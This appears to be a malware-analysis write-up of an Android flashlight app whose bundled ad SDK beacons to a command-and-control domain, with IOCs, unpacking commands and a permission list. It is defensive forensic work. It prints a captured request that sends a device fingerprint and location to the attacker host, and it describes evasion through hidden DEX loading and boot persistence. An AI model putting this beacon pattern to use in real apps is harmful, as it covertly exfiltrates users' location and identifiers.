Android App Forensic —
Malicious Ad SDK

Recovered network indicators, dynamic code loading paths, and IOCs from a compromised Android app bundling a rogue advertising SDK.

#android #malware #APK #network-forensics

Overview

A user submitted an APK from a third-party app store claiming excessive battery drain and unexpected data usage. Static and dynamic analysis revealed the app bundled a rogue ad SDK performing covert C2 communication and dynamic DEX loading.

// IOC Summary

C2 domain: metrics-cdn[.]net | IP: 185.220.101.47 | SHA256 of malicious dex: a3f8…c912

Static Analysis

Unpacking the APK

APKs are ZIP archives. Start by extracting and running apktool for resource decoding, then jadx for decompiled Java source.

apktool d suspicious.apk -o suspicious_unpacked
jadx -d suspicious_jadx suspicious.apk

Immediately suspicious: a classes2.dex packed inside assets/data/ — this is a classic sign of dynamic class loading used to evade static scanners.

Manifest Permissions

The AndroidManifest.xml requested an unusual permission set for what was marketed as a simple utility app:

READ_CONTACTS
READ_CALL_LOG
ACCESS_FINE_LOCATION
RECEIVE_BOOT_COMPLETED
FOREGROUND_SERVICE
// Warning

RECEIVE_BOOT_COMPLETED + a foreground service registration means this SDK persists across reboots. Classic spyware pattern.

Dynamic Analysis

Network Traffic

Running the app in an emulator with mitmproxy intercepting traffic, the SDK immediately beaconed out on first launch — before any user interaction.

POST /api/v2/init HTTP/1.1
Host: metrics-cdn.net
Content-Type: application/json

{
  "did": "c3a8...f912",
  "pkg": "com.flashlight.ultra",
  "sdkv": "4.2.1",
  "loc": "10.1234,76.5678"
}

The did field is a device fingerprint, and loc was being silently exfiltrated before any permission dialog was shown.

Conclusion

The rogue SDK was identified as a variant of the HiddenAds family, modified to add location exfiltration. The app was reported to the play store security team and the C2 infrastructure was flagged to the hosting provider.
